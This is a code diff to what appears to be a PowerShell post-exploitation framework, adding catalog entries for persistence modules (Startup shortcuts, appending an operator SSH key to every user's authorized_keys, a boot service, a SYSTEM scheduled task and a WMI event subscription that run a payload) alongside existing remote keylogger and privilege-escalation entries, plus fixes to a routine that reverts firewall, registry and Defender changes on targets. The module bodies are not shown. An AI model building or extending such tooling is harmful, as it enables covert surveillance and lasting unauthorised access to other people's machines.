@@ -733,6 +733,11 @@ function Get-ARActionCatalog {
     $items.Add((New-ARAction -Id '503' -Title 'Remote Keylogger' -Description (Get-ARText 'txt113' 'Log every keystroke typed on the target console') -Handler 'Invoke-ARModuleKeylogger'))
     $items.Add((New-ARAction -Id '904' -Title (Get-ARText 'txt174' 'Fast keylogger') -Description 'Log keystrokes and mirror the buffer back to the operator every 15 seconds' -Handler 'Invoke-ARModuleKeyloggerFast' -NeedsSession $true))
     $items.Add((New-ARAction -Id '504' -Title (Get-ARText 'txt175' 'Persistence kit') -Description 'Install a Run key, a scheduled task and a WMI subscription in one pass' -Handler 'Invoke-ARModulePersistenceKit' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '520' -Title (Get-ARText 'txt226' 'Startup shortcut') -Description (Get-ARText 'txt227' 'Drop a .lnk in the Startup folder of the current user and of all users') -Handler 'Invoke-ARModuleStartupShortcut' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '521' -Title (Get-ARText 'txt228' 'SSH authorized_keys') -Description (Get-ARText 'txt229' 'Append the operator public key to authorized_keys in every user profile') -Handler 'Invoke-ARModuleSshAuthorizedKeys' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '522' -Title (Get-ARText 'txt230' 'Service persistence') -Description (Get-ARText 'txt231' 'Register an automatic service that runs the payload at boot') -Handler 'Invoke-ARModuleServicePersistence' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '523' -Title (Get-ARText 'txt232' 'Boot task') -Description (Get-ARText 'txt233' 'Schedule a task that runs the payload as SYSTEM when the system starts') -Handler 'Invoke-ARModuleBootTask' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '524' -Title (Get-ARText 'txt234' 'WMI subscription') -Description (Get-ARText 'txt235' 'Bind a WMI event filter to a command consumer so the payload runs on every event') -Handler 'Invoke-ARModuleWmiSubscription' -NeedsSession $true))
 
     $items.Add((New-ARGroup -Title (Get-ARText 'txt68' 'Privilege escalation') -Description (Get-ARText 'txt144' 'Enumerate services, patches and paths to SYSTEM')))
     $items.Add((New-ARAction -Id '601' -Title (Get-ARText 'txt70' 'Get operating system information') -Description (Get-ARText 'txt114' 'Full enumeration of privesc surface and local misconfigurations') -Handler 'Invoke-ARModuleChachi'))
@@ -3500,7 +3505,7 @@ function Remove-ARTargetArtifacts {
     $registryBackup = @($script:ARRegistryBackup.ToArray())
     if ($registryBackup.Count -gt 0) {
         try {
-            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList $registryBackup -ScriptBlock {
+            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList (, $registryBackup) -ScriptBlock {
                 param($entries)
                 $failed = New-Object System.Collections.Generic.List[string]
                 foreach ($entry in $entries) {
@@ -3543,7 +3548,7 @@ function Remove-ARTargetArtifacts {
     if ($products.Count -gt 0) {
         try {
             Write-ARProgress -Activity 'Uninstalling MSI products' -Percent 10 -Status ('Removing ' + $products.Count + ' product(s)')
-            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList $products -ScriptBlock {
+            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList (, $products) -ScriptBlock {
                 param($productCodes)
                 $roots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
                 $failed = New-Object System.Collections.Generic.List[string]
@@ -3581,7 +3586,7 @@ function Remove-ARTargetArtifacts {
     if ($firewallRestore.Count -gt 0) {
         try {
             $ruleNames = @($firewallRestore | ForEach-Object { [string]$_.Name } | Where-Object { $_ -ne '' })
-            Invoke-ARRemote -Session $Session -ArgumentList $ruleNames -ScriptBlock {
+            Invoke-ARRemote -Session $Session -ArgumentList (, $ruleNames) -ScriptBlock {
                 param($names)
                 foreach ($name in $names) {
                     Set-NetFirewallRule -Name $name -Enabled False -ErrorAction SilentlyContinue
@@ -3600,7 +3605,7 @@ function Remove-ARTargetArtifacts {
     $defenderChanges = @($script:ARRemoteDefenderChanges.ToArray())
     if ($defenderChanges.Count -gt 0) {
         try {
-            Invoke-ARRemote -Session $Session -ArgumentList $defenderChanges -ScriptBlock {
+            Invoke-ARRemote -Session $Session -ArgumentList (, $defenderChanges) -ScriptBlock {
                 param($changes)
                 foreach ($change in $changes) {
                     $kind = [string]$change.Kind
